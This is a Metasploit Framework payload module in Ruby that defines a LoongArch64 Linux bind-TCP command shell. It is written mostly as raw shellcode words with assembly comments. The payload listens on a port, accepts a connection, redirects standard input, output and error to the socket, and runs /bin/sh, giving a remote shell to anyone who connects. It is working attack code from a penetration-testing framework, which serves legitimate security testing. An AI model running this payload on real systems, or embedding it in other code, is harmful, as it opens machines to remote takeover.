##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

module MetasploitModule
  CachedSize = 212

  include Msf::Payload::Single
  include Msf::Payload::Linux
  include Msf::Sessions::CommandShellOptions

  def initialize(info = {})
    super(
      merge_info(
        info,
        'Name' => 'Linux Command Shell, Bind TCP Inline',
        'Description' => 'Listen for a connection and spawn a command shell.',
        'Author' => ['bcoles'], # LoongArch64 shellcode and Metasploit module
        'License' => MSF_LICENSE,
        'Platform' => 'linux',
        'Arch' => ARCH_LOONGARCH64,
        'References' => [
          ['URL', 'https://loongson.github.io/LoongArch-Documentation/LoongArch-Vol1-EN.html']
        ],
        'Handler' => Msf::Handler::BindTcp,
        'Session' => Msf::Sessions::CommandShellUnix,
        'Payload' => {
          'Offsets' => {
            'LPORT' => [198, 'n']
          },
          'Payload' => [
            0x02ff8063, # addi.d sp,sp,-32

            # socket(AF_INET, SOCK_STREAM, IPPROTO_IP)
            0x0383180b, # ori a7,zero,198 (SYS_socket)
            0x03800006, # ori a2,zero,0
            0x03800405, # ori a1,zero,1
            0x03800804, # ori a0,zero,2
            0x002b0000, # syscall 0
            0x00150097, # or s0,a0,zero (save listen socket)
            0x60009c80, # blt a0,zero,fail

            # bind(socket, &sockaddr_in, 16)
            0x18000005, # pcaddi a1,0
            0x02c290a5, # addi.d a1,a1,164 (sockaddr)
            0x03804006, # ori a2,zero,16
            0x0383200b, # ori a7,zero,200 (SYS_bind)
            0x001502e4, # or a0,s0,zero
            0x002b0000, # syscall 0
            0x5c008080, # bne a0,zero,fail

            # listen(socket, 1)
            0x03800405, # ori a1,zero,1
            0x0383240b, # ori a7,zero,201 (SYS_listen)
            0x001502e4, # or a0,s0,zero
            0x002b0000, # syscall 0
            0x5c006c80, # bne a0,zero,fail

            # accept(socket, NULL, NULL)
            0x03800006, # ori a2,zero,0
            0x03800005, # ori a1,zero,0
            0x0383280b, # ori a7,zero,202 (SYS_accept)
            0x001502e4, # or a0,s0,zero
            0x002b0000, # syscall 0
            0x00150097, # or s0,a0,zero (save client socket)
            0x60005080, # blt a0,zero,fail

            # dup3(socket, fd, 0) for stderr, stdout, and stdin
            0x0380600b, # ori a7,zero,24 (SYS_dup3)
            0x03800c05, # ori a1,zero,3
            0x03800006, # ori a2,zero,0
            0x001502e4, # or a0,s0,zero
            0x02fffca5, # addi.d a1,a1,-1
            0x002b0000, # syscall 0
            0x5ffff4a0, # bne a1,zero,dup_loop

            # execve("/bin/sh", ["/bin/sh", NULL], NULL)
            0x0383740b, # ori a7,zero,221 (SYS_execve)
            0x14dcd2c4, # lu12i.w a0,452246
            0x0388bc84, # ori a0,a0,0x22f
            0x170e65e4, # lu32i.d a0,-494801
            0x03001884, # lu52i.d a0,a0,6
            0x29c00064, # st.d a0,sp,0
            0x00150064, # or a0,sp,zero
            0x29c02064, # st.d a0,sp,8 (argv[0])
            0x29c04060, # st.d zero,sp,16 (argv[1])
            0x02c02065, # addi.d a1,sp,8
            0x03800006, # ori a2,zero,0 (envp)
            0x002b0000, # syscall 0

            # exit(0)
            0x03800004, # ori a0,zero,0
            0x0381740b, # ori a7,zero,93 (SYS_exit)
            0x002b0000, # syscall 0

            # sockaddr_in (port patched by the framework)
            0x5c110002,
            0x00000000,
            0x00000000,
            0x00000000
          ].pack('V*')
        }
      )
    )
  end
end
